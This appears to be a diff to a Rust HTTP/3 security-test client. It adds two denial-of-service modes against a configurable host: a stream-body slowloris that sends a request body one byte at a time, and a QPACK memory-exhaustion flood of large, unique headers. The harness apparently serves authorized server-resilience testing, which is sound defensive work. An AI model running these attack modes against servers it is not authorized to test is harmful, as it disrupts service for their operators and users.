@@ -7,6 +7,7 @@
 //!               | handshake_slowloris | amplification_check | early_data_replay
 //!               | grpc_malformed | grpc_header_spoof | grpc_slowloris | grpc_stream_reset
 //!               | amplification_spoof | max_streams | migration_spoof | qpack_async_ref
+//!               | stream_body_slowloris | qpack_memory_exhaustion
 //! - HTTP3_REPORT
 //! - HTTP3_GRPC_PATH (default /grpc.test.v1.TestService/UnaryCall)
 //! - AMPLIFICATION_STRICT (default 1): amplification_check で ratio>3 をエラーにする
@@ -89,6 +90,11 @@ fn main() {
             .map(|s| format!("migration_spoof done detail={}", s)),
         "qpack_async_ref" => qpack_async_ref(&host, port, &path)
             .map(|s| format!("qpack_async_ref done detail={}", s)),
+        // F-97: レポート §4 フェーズ3
+        "stream_body_slowloris" => stream_body_slowloris(&host, port, &path)
+            .map(|s| format!("stream_body_slowloris done detail={}", s)),
+        "qpack_memory_exhaustion" => qpack_memory_exhaustion(&host, port, &path)
+            .map(|s| format!("qpack_memory_exhaustion done detail={}", s)),
         other => Err(format!("unknown HTTP3_MODE={}", other).into()),
     };
 
@@ -1111,6 +1117,115 @@ fn qpack_async_ref(
         "opened={} status={:?} closed={}",
         opened,
         last_status,
+        session.conn.is_closed()
+    ))
+}
+
+/// F-97 S-H3-14: 接続確立後にストリームボディを 1 バイトずつ極遅送信（Stream Body Slowloris）
+fn stream_body_slowloris(
+    host: &str,
+    port: u16,
+    path: &str,
+) -> Result<String, Box<dyn std::error::Error>> {
+    let mut session = establish_h3(host, port, 30_000)?;
+    let headers = vec![
+        quiche::h3::Header::new(b":method", b"POST"),
+        quiche::h3::Header::new(b":path", path.as_bytes()),
+        quiche::h3::Header::new(b":authority", host.as_bytes()),
+        quiche::h3::Header::new(b":scheme", b"https"),
+        quiche::h3::Header::new(b"content-type", b"application/octet-stream"),
+        // 大きめ CL を宣言しボディを極遅で送る
+        quiche::h3::Header::new(b"content-length", b"64"),
+    ];
+    let stream_id = session
+        .h3
+        .send_request(&mut session.conn, &headers, false)?;
+    pump_io(&mut session);
+
+    let payload = b"SLOWLORIS-BODY-BYTES-XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX";
+    let mut sent = 0usize;
+    for &byte in payload.iter().take(64) {
+        match session
+            .h3
+            .send_body(&mut session.conn, stream_id, &[byte], sent + 1 >= 64)
+        {
+            Ok(n) => sent += n,
+            Err(e) => {
+                return Ok(format!("stopped early sent={} err={}", sent, e));
+            }
+        }
+        pump_io(&mut session);
+        let _ = drain_events(&mut session);
+        std::thread::sleep(Duration::from_millis(80));
+        if session.conn.is_closed() {
+            break;
+        }
+    }
+    let start = Instant::now();
+    while start.elapsed() < Duration::from_secs(3) {
+        pump_io(&mut session);
+        let _ = drain_events(&mut session);
+        if session.conn.is_closed() {
+            break;
+        }
+        std::thread::sleep(Duration::from_millis(50));
+    }
+    Ok(format!(
+        "sent={} closed={}",
+        sent,
+        session.conn.is_closed()
+    ))
+}
+
+/// F-97 S-H3-15: 巨大・ユニークなヘッダを大量送信し QPACK 動的テーブル枯渇を誘発
+fn qpack_memory_exhaustion(
+    host: &str,
+    port: u16,
+    path: &str,
+) -> Result<String, Box<dyn std::error::Error>> {
+    let mut session = establish_h3(host, port, 30_000)?;
+    let big = "M".repeat(1024);
+    let mut opened = 0usize;
+    let mut stopped_err = None;
+    for i in 0..40 {
+        let mut headers = vec![
+            quiche::h3::Header::new(b":method", b"GET"),
+            quiche::h3::Header::new(b":path", path.as_bytes()),
+            quiche::h3::Header::new(b":authority", host.as_bytes()),
+            quiche::h3::Header::new(b":scheme", b"https"),
+        ];
+        // すべてユニークなヘッダ名で動的テーブル挿入を強制
+        for j in 0..16 {
+            let name = format!("x-qpack-mem-{}-{}", i, j);
+            headers.push(quiche::h3::Header::new(name.as_bytes(), big.as_bytes()));
+        }
+        match session.h3.send_request(&mut session.conn, &headers, true) {
+            Ok(_) => opened += 1,
+            Err(e) => {
+                stopped_err = Some(format!("{}", e));
+                break;
+            }
+        }
+        if i % 4 == 0 {
+            pump_io(&mut session);
+            let _ = drain_events(&mut session);
+        }
+        if session.conn.is_closed() {
+            break;
+        }
+    }
+    let start = Instant::now();
+    while start.elapsed() < Duration::from_secs(4) {
+        pump_io(&mut session);
+        let _ = drain_events(&mut session);
+        if session.conn.is_closed() {
+            break;
+        }
+    }
+    Ok(format!(
+        "opened={} err={:?} closed={}",
+        opened,
+        stopped_err,
         session.conn.is_closed()
     ))
 }
